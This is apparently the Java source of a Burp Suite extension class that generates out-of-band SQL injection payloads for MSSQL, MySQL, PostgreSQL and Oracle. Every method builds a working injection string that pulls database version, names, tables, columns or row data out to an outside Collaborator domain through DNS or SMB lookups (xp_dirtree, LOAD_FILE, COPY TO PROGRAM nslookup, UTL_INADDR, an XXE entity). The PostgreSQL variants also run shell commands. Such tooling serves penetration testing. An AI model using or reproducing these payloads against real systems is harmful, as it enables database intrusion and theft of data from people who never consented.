package burp;

import java.util.Map;
import burp.api.montoya.logging.Logging;



public class SQLiPayloadManager {
    private final Map<String, String> lastExfiltratedTableByDBMS;
    private final Map<String, String> lastExfiltratedColumnByDBMS;
    private final Logging logging;
    
    public SQLiPayloadManager(Map<String, String> lastExfiltratedTableByDBMS, 
                            Map<String, String> lastExfiltratedColumnByDBMS,
                            Logging logging) {
        this.lastExfiltratedTableByDBMS = lastExfiltratedTableByDBMS;
        this.lastExfiltratedColumnByDBMS = lastExfiltratedColumnByDBMS;
        this.logging = logging;
    }

    public String generatePayload(String dbms, String extractType, boolean hexEncoded, String collaboratorDomain) {
        String payload;
        
        switch (dbms) {
            case "Microsoft SQL Server (Stacked)":
                payload = generateMSSQLPayload(extractType, hexEncoded, collaboratorDomain);
                break;
            case "MySQL (Windows)":
                payload = generateMySQLPayload(extractType, hexEncoded, collaboratorDomain);
                break;
            case "PostgreSQL (Elevated Privileges)":
                payload = generatePostgreSQLPayload(extractType, hexEncoded, collaboratorDomain);
                break;
            case "Oracle (Elevated Privileges)":
                payload = generateOraclePrivPayload(extractType, hexEncoded, collaboratorDomain);
                break;
            case "Oracle (XXE)":
                payload = generateOracleXXEPayload(extractType, hexEncoded, collaboratorDomain);
                break;
            default:
                payload = "Error: Invalid DBMS selected";
        }
        
        return payload;
    }

    private String generateMSSQLPayload(String extractType, boolean hexEncoded, String collaboratorDomain) {
        String payload;
        
        switch (extractType) {
            case "Version":
                if (hexEncoded) {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST(@@VERSION AS VARCHAR)), 2), 1, 62); " +
                             "EXEC('master..xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                } else {
                    payload = "'; DECLARE @s varchar(62); " +
                             "SELECT @s = LEFT(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(" +
                             "LEFT(@@version, CHARINDEX('(X', @@version) + LEN('(X')), " +
                             "CHAR(13), ''), CHAR(10), ''), ' ', ''), ':', ''), '.', ''), '/', ''), '(', ''), ')', ''), 62); " +
                             "EXEC('master..xp_dirtree \"\\\\' + @s + '." + collaboratorDomain + "\\x\"'); -- a";
                }
                break;
                
            case "Database":
                if (hexEncoded) {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST(DB_NAME() AS VARCHAR)), 2), 1, 62); " +
                             "EXEC('master..xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                } else {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = (SELECT CONCAT('', DB_NAME())); " +
                             "EXEC('master..xp_dirtree \"\\\\'+@d+'." + collaboratorDomain + "\\x\"'); -- a";
                }
                break;
                
            case "Table":
                if (hexEncoded) {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST((" +
                             "SELECT TOP 1 TABLE_NAME FROM (" +
                             "SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS RowNum " +
                             "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' " +
                             "AND TABLE_CATALOG = 'master') AS RankedTables WHERE RowNum = 1) AS VARCHAR)), 2), 1, 62); " +
                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                } else {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = (SELECT TOP 1 TABLE_NAME FROM (" +
                             "SELECT TABLE_NAME, ROW_NUMBER() OVER (ORDER BY TABLE_NAME) AS RowNum " +
                             "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' " +
                             "AND TABLE_CATALOG = 'master') AS RankedTables WHERE RowNum = 1); " +
                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                }
                break;
                
            case "Column":
                String tableNameToUse = lastExfiltratedTableByDBMS.getOrDefault("Microsoft SQL Server (Stacked)", "testkitty");
                if (hexEncoded) {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST((" +
                             "SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
                             "WHERE TABLE_NAME = '" + tableNameToUse + "' " +
                             "ORDER BY COLUMN_NAME) AS VARCHAR)), 2), 1, 62); " +
                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                } else {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = (SELECT TOP 1 COLUMN_NAME FROM (" +
                             "SELECT COLUMN_NAME, ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS RowNum " +
                             "FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '" + tableNameToUse + "') " +
                             "AS RankedColumns WHERE RowNum = 1); " +
                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                }
                break;
                
            case "Row":
                String tableForRow = lastExfiltratedTableByDBMS.getOrDefault("Microsoft SQL Server (Stacked)", "testkitty");
                String columnForRow = lastExfiltratedColumnByDBMS.getOrDefault("Microsoft SQL Server (Stacked)", "description");
                if (hexEncoded) {
                    payload = "'; DECLARE @d varchar(62); " +
                             "SELECT @d = SUBSTRING(CONVERT(VARCHAR, CONVERT(VARBINARY, CAST(" + columnForRow + " AS VARCHAR)), 2), 1, 62) FROM (" +
                             "SELECT " + columnForRow + ", ROW_NUMBER() OVER (ORDER BY " + columnForRow + ") AS RowNum " +
                             "FROM " + tableForRow + ") AS RankedRows WHERE RowNum = 1; " +
                             "EXEC('master.sys.xp_dirtree \"\\\\' + @d + '." + collaboratorDomain + "\\x\"'); -- a";
                } else {
                    payload = "'; DECLARE @data varchar(62); " +
                             "SELECT @data = (SELECT TOP 1 " + columnForRow + " FROM (" +
                             "SELECT " + columnForRow + ", ROW_NUMBER() OVER (ORDER BY " + columnForRow + ") AS RowNum " +
                             "FROM " + tableForRow + ") AS RankedRows WHERE RowNum = 1); " +
                             "EXEC('master.sys.xp_dirtree \"\\\\' + @data + '." + collaboratorDomain + "\\x\"'); -- a";
                }
                break;
                
            default:
                payload = "Error: Invalid extraction type selected";
        }
        
        return payload;
    }

    private String generateMySQLPayload(String extractType, boolean hexEncoded, String collaboratorDomain) {
        String payload;
        
        switch (extractType) {
            case "Version":
                if (hexEncoded) {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT HEX(version())),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                } else {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT version()),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                }
                break;
                
            case "Database":
                if (hexEncoded) {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT HEX(database())),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                } else {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT database()),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                }
                break;
                
            case "Table":
                if (hexEncoded) {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT HEX(table_name) FROM information_schema.tables " +
                             "WHERE table_schema=database() LIMIT 1),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                } else {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT table_name FROM information_schema.tables " +
                             "WHERE table_schema=database() LIMIT 1),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                }
                break;
                
            case "Column":
                String tableNameToUse = lastExfiltratedTableByDBMS.getOrDefault("MySQL (Windows)", "target_table");
                if (hexEncoded) {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT HEX(column_name) FROM information_schema.columns " +
                             "WHERE table_schema=database() AND table_name='" + tableNameToUse + "' AND column_name != 'ID' LIMIT 1),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                } else {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT column_name FROM information_schema.columns " +
                             "WHERE table_schema=database() AND table_name='" + tableNameToUse + "' AND column_name != 'ID' LIMIT 1),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                }
                break;
                
            case "Row":
                String tableForRow = lastExfiltratedTableByDBMS.getOrDefault("MySQL (Windows)", "target_table");
                String columnForRow = lastExfiltratedColumnByDBMS.getOrDefault("MySQL (Windows)", "target_column");
                if (hexEncoded) {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT HEX(" + columnForRow + ") FROM " + tableForRow + " LIMIT 1),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                } else {
                    payload = "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(" +
                             "SELECT " + columnForRow + " FROM " + tableForRow + " LIMIT 1),'" +
                             "." + collaboratorDomain + "\\\\a'));-- a";
                }
                break;
                
            default:
                payload = "Error: Invalid extraction type selected";
        }
        
        return payload;
    }

    private String generatePostgreSQLPayload(String extractType, boolean hexEncoded, String collaboratorDomain) {
        String dbmsType = "PostgreSQL (Elevated Privileges)";
        String payload = "";

        switch (extractType) {
            case "Version":
                if (hexEncoded) {
                    payload = "'; COPY (SELECT encode(version()::bytea, 'hex')) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                } else {
                    payload = "'; COPY (SELECT regexp_replace(version(), '[^a-zA-Z0-9]', '', 'g')) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                }
                break;
                
            case "Database":
                if (hexEncoded) {
                    payload = "'; COPY (SELECT encode(current_database()::bytea, 'hex')) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                } else {
                    payload = "'; COPY (SELECT regexp_replace(current_database(), '[^a-zA-Z0-9]', '', 'g')) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                }
                break;
                
            case "Table":
                if (hexEncoded) {
                    payload = "'; COPY (SELECT encode((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1)::bytea, 'hex'))" +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                } else {
                    payload = "'; COPY (SELECT regexp_replace((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1), " +
                             "'[^a-zA-Z0-9]', '', 'g')) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                }
                break;
                
            case "Column":
                String tableNameToUse = lastExfiltratedTableByDBMS.getOrDefault(dbmsType, "<TABLE_NAME_GOES_HERE>");
                if (hexEncoded) {
                    payload = "'; COPY (SELECT encode(column_name::bytea, 'hex') " +
                             "FROM information_schema.columns WHERE table_schema = 'public' AND table_name = '" + tableNameToUse + "' AND column_name != 'id' " +
                             "ORDER BY ordinal_position LIMIT 1) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                } else {
                    payload = "'; COPY (SELECT regexp_replace(column_name, '[^a-zA-Z0-9]', '', 'g') " +
                             "FROM information_schema.columns WHERE table_schema = 'public' AND table_name = '" + tableNameToUse + "' AND column_name != 'id' " +
                             "ORDER BY ordinal_position LIMIT 1) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                }
                break;
                            
            case "Row":
                String tableForRow = lastExfiltratedTableByDBMS.getOrDefault(dbmsType, "<TABLE_NAME_GOES_HERE>");
                String columnForRow = lastExfiltratedColumnByDBMS.getOrDefault(dbmsType, "<COLUMN_NAME_GOES_HERE>");
                if (hexEncoded) {
                    payload = "'; COPY (SELECT encode(" + columnForRow + "::text::bytea, 'hex') " +
                             "FROM " + tableForRow + " LIMIT 1) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                } else {
                    payload = "'; COPY (SELECT regexp_replace(" + columnForRow + "::text, '[^a-zA-Z0-9]', '', 'g') " +
                             "FROM " + tableForRow + " LIMIT 1) " +
                             "TO PROGRAM 'nslookup $(head -c 62 < /dev/stdin)." + collaboratorDomain + "'; --";
                }
                break;
                
            default:
                payload = "Error: Invalid extraction type selected";
        }
        
        return payload;
    }

    private String generateOraclePrivPayload(String extractType, boolean hexEncoded, String collaboratorDomain) {
        String dbmsType = "Oracle (Elevated Privileges)";
        String payload = "";

        switch (extractType) {
            case "Version":
                if (hexEncoded) {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT RAWTOHEX(SUBSTR(banner, 1, 20)) FROM v$version WHERE ROWNUM=1)||'." + collaboratorDomain + "') FROM DUAL)||'";
                } else {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT REGEXP_REPLACE(SUBSTR(banner, 1, 20), " + 
                             "'[^a-zA-Z0-9]', '') FROM v$version WHERE ROWNUM=1)||'." + collaboratorDomain + "') FROM DUAL)||'";
                }
                break;
                
            case "Database":
                if (hexEncoded) {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT RAWTOHEX(SYS_CONTEXT('USERENV', 'DB_NAME')) FROM DUAL)||'." + collaboratorDomain + "') FROM DUAL)||'";
                } else {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT REGEXP_REPLACE(SYS_CONTEXT('USERENV', 'DB_NAME'), " + 
                             "'[^a-zA-Z0-9]', '') FROM DUAL)||'." + collaboratorDomain + "') FROM DUAL)||'";
                }
                break;
                
            case "Table":
                if (hexEncoded) {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT RAWTOHEX(SUBSTR(owner || '.' || table_name, 1, 40)) FROM all_tables " +
                             "WHERE owner NOT LIKE '%SYS%' AND owner NOT IN ('SYSTEM', 'OUTLN', 'DBSNMP', 'APPQOSSYS', 'XDB') " +
                             "AND ROWNUM=1)||'." + collaboratorDomain + "') FROM DUAL)||'";
                } else {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT REGEXP_REPLACE(SUBSTR(owner || '.' || table_name, 1, 40), " + 
                             "'[^a-zA-Z0-9.]', '') FROM all_tables " +
                             "WHERE owner NOT LIKE '%SYS%' AND owner NOT IN ('SYSTEM', 'OUTLN', 'DBSNMP', 'APPQOSSYS', 'XDB') " +
                             "AND ROWNUM=1)||'." + collaboratorDomain + "') FROM DUAL)||'";
                }
                break;
                
            case "Column":
                String tableNameToUse = lastExfiltratedTableByDBMS.getOrDefault(dbmsType, "<SCHEMA.TABLE_NAME_GOES_HERE>");
                String[] parts = tableNameToUse.split("\\.");
                String schemaName = parts.length > 1 ? parts[0] : "CURRENT_SCHEMA";
                String tableName = parts.length > 1 ? parts[1] : tableNameToUse;
                
                if (hexEncoded) {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT RAWTOHEX(SUBSTR(column_name, 1, 40)) FROM all_tab_columns " +
                             "WHERE owner='" + schemaName + "' AND table_name='" + tableName + "' " +
                             "AND column_name!='ID' AND ROWNUM=1)||'." + collaboratorDomain + "') FROM DUAL)||'";
                } else {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT REGEXP_REPLACE(SUBSTR(column_name, 1, 40), " + 
                             "'[^a-zA-Z0-9]', '') FROM all_tab_columns " +
                             "WHERE owner='" + schemaName + "' AND table_name='" + tableName + "' " +
                             "AND column_name!='ID' AND ROWNUM=1)||'." + collaboratorDomain + "') FROM DUAL)||'";
                }
                break;
                
            case "Row":
                String tableForRow = lastExfiltratedTableByDBMS.getOrDefault(dbmsType, "<SCHEMA.TABLE_NAME_GOES_HERE>");
                String columnForRow = lastExfiltratedColumnByDBMS.getOrDefault(dbmsType, "<COLUMN_NAME_GOES_HERE>");
                
                String[] tableParts = tableForRow.split("\\.");
                String rowSchemaName = tableParts.length > 1 ? tableParts[0] : "CURRENT_SCHEMA";
                String rowTableName = tableParts.length > 1 ? tableParts[1] : tableForRow;
                String fullyQualifiedTable = rowSchemaName + "." + rowTableName;
                
                if (hexEncoded) {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT RAWTOHEX(SUBSTR(" + columnForRow + 
                             ", 1, 40)) FROM " + fullyQualifiedTable + " WHERE ROWNUM = 1)||'." + collaboratorDomain + 
                             "') FROM DUAL)||'";
                } else {
                    payload = "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT REGEXP_REPLACE(SUBSTR(" + columnForRow + 
                             ", 1, 40), '[^a-zA-Z0-9]', '') FROM " + fullyQualifiedTable + " WHERE ROWNUM = 1)||'." + collaboratorDomain + 
                             "') FROM DUAL)||'";
                }
                break;
                
            default:
                payload = "Error: Invalid extraction type selected";
        }
        
        return payload;
    }

    private String generateOracleXXEPayload(String extractType, boolean hexEncoded, String collaboratorDomain) {
        String dbmsType = "Oracle (XXE)";
        String payload = "";
        String query = "";
        
        // XXE Base template with URL encoding for special characters
        String xxeTemplate = "'||(SELECT+extractvalue(xmltype('<?xml+version=\"1.0\"+encoding=\"UTF-8\"%3F>" +
                            "<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http://'||(%QUERY%)||'.%DOMAIN%/\">+" +
                            "%25remote%3b]>'),'/l')+FROM+dual)||'";

        switch (extractType) {
            case "Version":
                if (hexEncoded) {
                    query = "(SELECT+LOWER(RAWTOHEX(SUBSTR(banner,1,20)))+FROM+v$version+WHERE+ROWNUM=1)";
                } else {
                    query = "(SELECT+REGEXP_REPLACE(SUBSTR(banner,1,40),'[^a-zA-Z0-9]','')+FROM+v$version+WHERE+ROWNUM=1)";
                }
                break;
                
            case "Database":
                if (hexEncoded) {
                    query = "(SELECT+RAWTOHEX(SYS_CONTEXT('USERENV','DB_NAME'))+FROM+DUAL)";
                } else {
                    query = "(SELECT+REGEXP_REPLACE(SYS_CONTEXT('USERENV','DB_NAME'),'[^a-zA-Z0-9]','')+FROM+DUAL)";
                }
                break;
                
            case "Table":
                if (hexEncoded) {
                    query = "(SELECT+RAWTOHEX(SUBSTR(owner||'.'||table_name,1,40))+FROM+all_tables+" +
                           "WHERE+owner+NOT+LIKE+'%25SYS%25'+AND+owner+NOT+IN+" +
                           "('SYSTEM','OUTLN','DBSNMP','APPQOSSYS','XDB')+AND+ROWNUM=1)";
                } else {
                    query = "(SELECT+REGEXP_REPLACE(SUBSTR(owner||'.'||table_name,1,40),'[^a-zA-Z0-9.]','')+FROM+all_tables+" +
                           "WHERE+owner+NOT+LIKE+'%25SYS%25'+AND+owner+NOT+IN+" +
                           "('SYSTEM','OUTLN','DBSNMP','APPQOSSYS','XDB')+AND+ROWNUM=1)";
                }
                break;
                
            case "Column":
                String tableNameToUse = lastExfiltratedTableByDBMS.getOrDefault(dbmsType, "<SCHEMA.TABLE_NAME_GOES_HERE>");
                String[] parts = tableNameToUse.split("\\.");
                String schemaName = parts.length > 1 ? parts[0] : "CURRENT_SCHEMA";
                String tableName = parts.length > 1 ? parts[1] : tableNameToUse;
                
                if (hexEncoded) {
                    query = "(SELECT+RAWTOHEX(SUBSTR(column_name,1,40))+FROM+all_tab_columns+" +
                           "WHERE+owner='" + schemaName + "'+AND+table_name='" + tableName + "'+" +
                           "AND+column_name!='ID'+AND+ROWNUM=1)";
                } else {
                    query = "(SELECT+REGEXP_REPLACE(SUBSTR(column_name,1,40),'[^a-zA-Z0-9]','')+FROM+all_tab_columns+" +
                           "WHERE+owner='" + schemaName + "'+AND+table_name='" + tableName + "'+" +
                           "AND+column_name!='ID'+AND+ROWNUM=1)";
                }
                break;
                
            case "Row":
                String tableForRow = lastExfiltratedTableByDBMS.getOrDefault(dbmsType, "<SCHEMA.TABLE_NAME_GOES_HERE>");
                String columnForRow = lastExfiltratedColumnByDBMS.getOrDefault(dbmsType, "<COLUMN_NAME_GOES_HERE>");
                
                String[] tableParts = tableForRow.split("\\.");
                String rowSchemaName = tableParts.length > 1 ? tableParts[0] : "CURRENT_SCHEMA";
                String rowTableName = tableParts.length > 1 ? tableParts[1] : tableForRow;
                String fullyQualifiedTable = rowSchemaName + "." + rowTableName;
                
                if (hexEncoded) {
                    query = "(SELECT+RAWTOHEX(SUBSTR(" + columnForRow + ",1,40))+FROM+" + fullyQualifiedTable + 
                           "+WHERE+ROWNUM=1)";
                } else {
                    query = "(SELECT+REGEXP_REPLACE(SUBSTR(" + columnForRow + ",1,40),'[^a-zA-Z0-9]','')+FROM+" + 
                           fullyQualifiedTable + "+WHERE+ROWNUM=1)";
                }
                break;
                
            default:
                return "Error: Invalid extraction type selected";
        }
        
        // Format final payload using the template
        payload = xxeTemplate
            .replace("%QUERY%", query)
            .replace("%DOMAIN%", collaboratorDomain);
        
        return payload;
    }
}